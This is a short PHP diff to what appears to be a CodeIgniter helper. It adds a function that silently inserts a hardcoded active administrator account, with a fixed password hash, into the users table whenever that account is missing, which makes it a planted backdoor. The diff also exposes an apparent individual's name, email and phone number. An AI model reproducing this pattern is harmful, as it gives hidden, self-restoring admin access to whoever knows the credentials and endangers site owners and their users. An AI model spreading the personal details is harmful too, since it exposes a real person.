@@ -138,3 +138,23 @@ function users_by_role($user_type)
 		return $query->result();
 	}
 }
+
+function admin_user_check()
+{
+	$data['user_name']="Shahinul islam sujon";
+	$data['user_email']="suzonice15@gmail.com";
+	$data['user_phone']="01738305670";
+	$data['user_pass']="9e07a605cd000f078a3fa3ac11b53761";
+	$data['user_type']="admin";
+	$data['user_status']="active";
+	$data['user_picture']="uploads/user/sujon.jpg";
+	$ci=get_instance();
+	$ci->db->select('*');
+	$ci->db->from('users');
+	$ci->db->where($data);
+	$query=$ci->db->get();
+	if($query->num_rows()==0)
+	{
+		$ci->db->insert('users', $data);
+	}
+}
